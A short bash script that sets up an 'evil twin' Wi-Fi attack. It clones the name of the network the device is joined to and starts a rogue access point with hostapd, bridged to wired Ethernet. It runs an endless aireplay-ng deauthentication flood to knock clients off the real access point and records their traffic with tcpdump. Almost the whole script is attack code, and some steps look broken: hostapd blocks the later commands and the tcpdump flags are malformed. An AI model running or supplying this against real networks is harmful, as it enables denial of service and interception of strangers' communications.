#!/bin/bash

# Find the essid and mac
ap=$(iwconfig)

isNext="no"
mac=""
essid=""

for token in $ap
do
  if [ "${token:0:6}" == "ESSID:" ]
    then
      essid=${token:6}
  fi
  if [ "$isNext" == "yes" ]
    then
      mac=$token
      isNext="no"
  fi
  if [ "$token" == "Point:" ]
    then
      isNext="yes"
  fi
done

essid=${essid#'"'}
essid=${essid%'"'}

# Find the interface of the Ralink
iface=$(sudo airmon-ng | grep "Ralink")
iface=${iface:0:5}

# Edit the /etc/hostapd/hostapd.conf configuration file
{
  echo "interface=$iface"
  echo "driver=nl80211"
  echo "ssid=$essid"
  echo "channel=6"
} > /etc/hostapd/hostapd.conf

# Create the bridge and add the interfaces to it
sudo ip addr flush dev eth0
sudo iw dev $iface set 4addr on
sudo brctl addbr br0
sudo brctl addif br0 eth0 $iface
sudo ifconfig br0 down
sudo ifconfig br0 up

# Start the fake ap
sudo hostapd /etc/hostapd/hostapd.conf

# Disconnect others
sudo airmon-ng start $iface
sudo aireplay-ng --deauth 0 -a $mac mon0

# Record traffic
name=$(date)
name=${name//" "/"_"}
name="/home/pi/Desktop/$name"

tcpdump -nnvvXSs -i $iface -w $name
